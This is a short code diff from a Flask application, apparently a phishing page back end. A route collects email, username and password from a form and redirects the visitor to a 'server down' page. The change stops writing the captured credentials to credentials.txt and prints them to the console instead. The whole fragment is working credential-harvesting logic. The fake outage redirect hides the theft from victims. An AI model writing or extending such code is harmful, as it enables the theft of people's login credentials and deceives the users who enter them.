@@ -13,8 +13,9 @@ def log_email():
     password = request.form.get("password")
 
     if email or (username and password):
-        with open("credentials.txt", "a") as file:
-            file.write(f"Email: {email if email else 'N/A'}, Username: {username}, Password: {password}\n")
+        # with open("credentials.txt", "a") as file:
+        #     file.write(f"Email: {email if email else 'N/A'}, Username: {username}, Password: {password}\n")
+        print(f"Email: {email}, Username: {username}, Password: {password}")
 
     return redirect(url_for('server_down'))
 
